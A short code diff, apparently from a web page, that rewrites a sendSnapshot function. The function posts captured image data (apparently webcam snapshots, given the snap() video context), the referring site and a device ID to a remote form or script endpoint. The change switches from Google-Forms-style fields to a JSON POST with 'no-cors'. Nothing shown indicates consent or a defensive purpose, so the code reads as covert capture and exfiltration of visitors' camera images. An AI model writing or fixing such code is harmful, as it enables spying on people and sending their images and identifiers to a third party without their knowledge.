@@ -9,21 +9,21 @@
     const referrer = document.referrer || 'Unknown Site';
 
     function sendSnapshot(imgData) {
-      const formData = new FormData();
-      formData.append("entry.2012483072", imgData);
-      formData.append("entry.500527079", referrer);
-      formData.append("entry.1027569634", deviceID);
-
-      fetch(formURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: formData
-      }).then(() => {
-        console.log("Logged");
-      }).catch((err) => {
-        console.error("Error:", err);
-      });
-    }
+  fetch(scriptURL, {
+    method: 'POST',
+    body: JSON.stringify({
+      device: deviceID,
+      site: referrer,
+      image: imgData
+    }),
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    mode: 'no-cors' // THIS LINE added
+  })
+  .then(res => console.log("Logged"))
+  .catch(err => console.log("Fetch error: ", err));
+}
 
     function snap() {
       const video = document.createElement('video');
